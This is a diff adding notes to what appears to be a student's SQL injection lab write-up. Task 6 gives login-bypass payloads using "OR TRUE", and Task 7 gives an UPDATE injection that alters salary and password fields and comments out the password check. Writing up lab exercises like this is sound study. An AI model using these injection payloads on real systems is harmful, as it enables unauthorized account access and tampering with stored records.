@@ -51,3 +51,24 @@
 
 
 * Task 4
+
+* Task 5
+
+* Task 6
+*** If we provide eid with {{1' OR TRUE}} and password with {{pass' OR TRUE}} the transferred SQL looks like below.
+    #+BEGIN_SRC sql
+      SELECT * FROM customers
+      WHERE eid='1' OR TRUE AND
+      password='pass' OR TRUE;
+    #+END_SRC
+    This in turn will either spit up all users or sign me as first user.
+    Or we can inject other conditions instead of TRUE to get access for a specific user if we know the columns of the database.
+
+* Task 7
+*** If we set name {{Reddington', salary=1}} and we know an information like eid or other column value unique to the attacker we can update any columns we want.
+    Here we are assuming that we know the employee id, then we have to pass {{1';--}} to the employee id.
+    #+BEGIN_SRC sql
+      UPDATE employee
+      SET name='Reddington', salary=1, password='$hashed_newpwd'
+      WHERE eid = '1';--and password='$hashed_oldpwd';
+    #+END_SRC
